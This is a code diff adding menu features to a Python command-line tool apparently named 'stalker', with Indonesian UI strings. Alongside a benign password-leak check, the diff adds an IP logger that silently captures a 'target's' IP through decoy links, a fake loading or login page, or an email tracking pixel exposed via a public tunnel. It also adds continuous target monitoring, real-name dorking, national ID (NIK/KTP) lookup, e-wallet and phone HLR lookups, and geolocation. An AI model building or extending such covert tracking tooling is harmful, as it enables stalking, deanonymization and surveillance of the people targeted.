@@ -228,6 +228,10 @@ def show_menu():
         term.print_divider()
         print()
         print("  [u] Update Maigret database (refresh site list)")
+        print("  [n] Search by real name")
+        print("  [m] Monitor a target (real-time alerts)")
+        print("  [l] Check password leak (Pwned)")
+        print("  [g] IP Logger (tracking link)")
         print()
         value = input("  Enter username, email, or phone (or 'exit' to quit): ").strip()
         if value.lower() in ("exit", "quit", "0"):
@@ -237,6 +241,22 @@ def show_menu():
             term.print_phase(0, "Updating", "Refreshing Maigret site list...")
             os.system("python -m maigret --update-db")
             input("  Update complete. Press Enter to continue...")
+            continue
+        if value.lower() == "n":
+            show_name_menu()
+            input("  Press Enter to continue...")
+            continue
+        if value.lower() == "m":
+            show_monitor_menu()
+            input("  Press Enter to continue...")
+            continue
+        if value.lower() == "l":
+            show_leak_menu()
+            input("  Press Enter to continue...")
+            continue
+        if value.lower() == "g":
+            show_iplogger_menu()
+            input("  Press Enter to continue...")
             continue
         if not value:
             term.print_error("Input required!")
@@ -779,12 +799,23 @@ async def _run_ip_tracker(ip_or_text: str):
         print(f"  City     : {result.get('city','?')}")
         print(f"  ISP      : {result.get('isp','?')}")
         print(f"  ASN      : {result.get('asn','?')}")
+        if result.get('geo_confidence'):
+            print(f"  Geo conf : {result['geo_confidence']} (konsensus 8 sumber)")
+        if result.get('geo_note'):
+            print(f"  Geo note : {result['geo_note']}")
         if result.get('is_proxy'):
             term.print_warning("  ⚠  Proxy/VPN detected!")
         if result.get('shodan', {}).get('open_ports'):
             print(f"  Ports    : {', '.join(str(p) for p in result['shodan']['open_ports'])}")
         if result.get('shodan', {}).get('vulns'):
             term.print_warning(f"  CVEs     : {', '.join(result['shodan']['vulns'][:3])}")
+        rev = result.get('reverse_ip', {})
+        if rev.get('count'):
+            doms = rev['domains'][:8]
+            more = f" +{rev['count'] - 8}" if rev['count'] > 8 else ""
+            print(f"  ReverseIP: {', '.join(doms)}{more}")
+        if result.get('threat', {}).get('listed'):
+            term.print_warning("  ⚠  IP ada di daftar CINS Army (berbahaya)")
         if result.get('map_url'):
             print(f"  Map      : {result['map_url']}")
         print()
@@ -839,6 +870,173 @@ def show_ip_menu():
     ip = input("\n  Enter IP address (or 'me' for your IP): ").strip()
     if ip:
         asyncio.run(_run_ip_tracker(ip))
+
+
+def show_iplogger_menu():
+    """Standalone IP Logger — tracking link to capture a target's IP silently."""
+    from stalker.modules.ip_logger import run_ip_logger
+    from stalker.reporters import terminal as term
+
+    print("\n  IP LOGGER — tangkap IP target saat mereka klik link")
+    print("  [1] Redirect + LIVE — redirect ke URL, tetap ping tiap 15s sambil terbuka")
+    print("  [2] Halaman HTML custom (mis. 'loading...', fake login)")
+    print("  [3] Pixel 1x1 (untuk email tracking)")
+    print()
+    choice = input("  Pilih decoy [1]: ").strip() or "1"
+    redirect_url = None
+    page_html = None
+    pixel = False
+    live = False
+
+    if choice == "1":
+        live = True
+        redirect_url = input(
+            "  URL redirect (kosong = default): ").strip() or \
+            "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+    elif choice == "2":
+        page_html = input("  HTML (kosong = default): ").strip() or (
+            "<!doctype html><html><body style='background:#000;color:#fff;"
+            "font-family:sans-serif;display:flex;align-items:center;"
+            "justify-content:center;height:100vh;margin:0'>"
+            "<h1>Loading…</h1></body></html>")
+    else:
+        pixel = True
+
+    port_raw = input("  Port [8080]: ").strip() or "8080"
+    try:
+        port = int(port_raw)
+    except ValueError:
+        port = 8080
+
+    term.print_header("IP LOGGER — TRACKING LINK")
+    print()
+
+    async def _run():
+        try:
+            await run_ip_logger(port=port, redirect_url=redirect_url,
+                                page_html=page_html, pixel=pixel, live=live,
+                                public_tunnel=True)
+        except OSError as e:
+            term.print_error(f"Port {port} tidak bisa dipakai: {e}")
+
+    try:
+        asyncio.run(_run())
+    except KeyboardInterrupt:
+        print("\n  Logger dihentikan.")
+
+
+def show_new_osint_menu(key: str):
+    """Menu dispatcher 10 fitur OSINT baru (reuse output CLI stalker)."""
+    from stalker.reporters import terminal as term
+    tools = {
+        "k": ("NIK/KTP lookup", "NIK 16 digit", "nik"),
+        "q": ("QR/barcode decoder", "path file / URL gambar", "qr"),
+        "w": ("E-wallet OSINT", "nomor HP (08xx)", "ewallet"),
+        "o": ("Status online checker", "username Telegram / nomor HP", "online"),
+        "h": ("Phone HLR lookup", "nomor HP", "hlr"),
+        "r": ("Reverse email", "alamat email", "revemail"),
+        "b": ("Gaming OSINT", "username", "gaming"),
+        "s": ("IG/TikTok deep OSINT", "username", "social"),
+        "v": ("Exposed device search", "alamat IP", "device"),
+        "x": ("Visual geolocation", "path file / URL gambar", "geolocate"),
+    }
+    label, hint, cmd = tools.get(key, (None, None, None))
+    if not label:
+        term.print_error("Pilihan tidak dikenal.")
+        return
+    target = input(f"\n  {label} — target ({hint}): ").strip()
+    if not target:
+        term.print_error("Input kosong.")
+        return
+    import subprocess
+    subprocess.run([sys.executable, "-m", "stalker.cli", cmd, target])
+
+
+async def _run_real_name(full_name: str):
+    """Investigate a person by real name (variants + dork queries)."""
+    from stalker.modules.real_name_detector import (
+        process_real_name_input, generate_name_search_queries,
+    )
+    term.print_phase(1, "Real Name Detection", f"Analyzing '{full_name}'...")
+    res = await process_real_name_input(full_name)
+    if not res.get("is_real_name"):
+        term.print_warning(f"  '{full_name}' doesn't look like a real name.")
+        return
+    parts = res.get("name_parts", {})
+    variants = res.get("search_variants", [])
+    queries = await generate_name_search_queries(full_name)
+    term.print_divider()
+    term.print_header("REAL NAME REPORT")
+    print(f"\n  Name     : {full_name}")
+    print(f"  First    : {', '.join(parts.get('first', []) or ['-'])}")
+    print(f"  Last     : {', '.join(parts.get('last', []) or ['-'])}")
+    print(f"  Variants : {len(variants)}")
+    print()
+    for v in variants[:20]:
+        print(f"    • {v}")
+    print(f"\n  Google Dork queries:")
+    for q in queries.get("fullname", []):
+        print(f"    • {q}")
+    print()
+
+
+def show_name_menu():
+    """Standalone real-name investigation menu."""
+    name = input("\n  Enter full name (e.g., 'Zell Ishikawa'): ").strip()
+    if name:
+        asyncio.run(_run_real_name(name))
+
+
+def show_monitor_menu():
+    """Standalone target monitor menu (GitHub/Reddit/Pastebin alerts)."""
+    from stalker.modules.realtime_monitor import monitor_once, monitor_loop
+    target = input("\n  Enter target (username/email/phone): ").strip()
+    if not target:
+        return
+    ttype = ("email" if "@" in target and "." in target.split("@")[-1]
+             else "phone" if target.replace(" ", "").replace("-", "").replace("+", "").isdigit()
+             else "username")
+    once = input("  One-time check (y) or continuous loop (n)? [n]: ").strip().lower()
+    if once == "y":
+        asyncio.run(monitor_once(target, ttype))
+    else:
+        interval = input("  Check interval in minutes [30]: ").strip() or "30"
+        asyncio.run(monitor_loop(target, ttype, int(interval)))
+
+
+def show_leak_menu():
+    """Standalone password leak check menu (Pwned Passwords, k-anonymity)."""
+    from stalker.modules.password_leak import check_password_leak, check_from_text
+    pw = input("\n  Enter password (or paste text to scan): ").strip()
+    if not pw:
+        return
+
+    async def _run():
+        term.print_phase(1, "Password Leak Check", "Checking against Pwned Passwords...")
+        term.print_divider()
+        term.print_header("PASSWORD LEAK REPORT")
+        if " " in pw or len(pw) > 40:
+            res = await check_from_text(pw)
+            print(f"\n  Kandidat dicek: {len(res.get('details', []))}")
+            for d in res.get("details", []):
+                hint = d.get("password_hint", "***")
+                if d.get("found"):
+                    term.print_warning(f"  ⚠  '{hint}' bocor {d['count']:,} kali")
+                elif d.get("error"):
+                    print(f"  ?  '{hint}' gagal: {d['error']}")
+                else:
+                    print(f"  ✓  '{hint}' tidak ditemukan")
+        else:
+            res = await check_password_leak(pw)
+            if res.get("found"):
+                term.print_warning(f"\n  ⚠  Password BOCOR — muncul {res['count']:,} kali di data breach!")
+            elif res.get("error"):
+                term.print_error(f"\n  Gagal: {res['error']}")
+            else:
+                term.print_success("\n  ✓ Password tidak ditemukan di breach.")
+        print()
+
+    asyncio.run(_run())
 
 
 async def _run_cyber_intel_full(target: str, input_type: str):
@@ -943,6 +1141,15 @@ def show_menu_v2():
         print()
         print("  [u] Update Maigret database")
         print("  [i] Track an IP address")
+        print("  [g] IP Logger (tracking link)")
+        print("  [n] Search by real name")
+        print("  [m] Monitor a target")
+        print("  [l] Check password leak")
+        print("  [k] NIK/KTP lookup         [q] QR/barcode decoder")
+        print("  [w] E-wallet OSINT         [o] Status online checker")
+        print("  [h] Phone HLR lookup       [r] Reverse email")
+        print("  [b] Gaming OSINT           [s] IG/TikTok deep")
+        print("  [v] Exposed device search  [x] Visual geolocation")
         print()
         value = input("  Enter username, email, or phone (or 'exit'): ").strip()
         if value.lower() in ("exit", "quit", "0"):
@@ -952,6 +1159,16 @@ def show_menu_v2():
             input("  Update complete. Press Enter..."); continue
         if value.lower() == "i":
             show_ip_menu(); input("  Press Enter..."); continue
+        if value.lower() == "g":
+            show_iplogger_menu(); input("  Press Enter..."); continue
+        if value.lower() == "n":
+            show_name_menu(); input("  Press Enter..."); continue
+        if value.lower() == "m":
+            show_monitor_menu(); input("  Press Enter..."); continue
+        if value.lower() == "l":
+            show_leak_menu(); input("  Press Enter..."); continue
+        if value.lower() in ("k", "q", "w", "o", "h", "r", "b", "s", "v", "x"):
+            show_new_osint_menu(value.lower()); input("  Press Enter..."); continue
         if not value:
             term.print_error("Input required!"); input("  Press Enter..."); continue
 
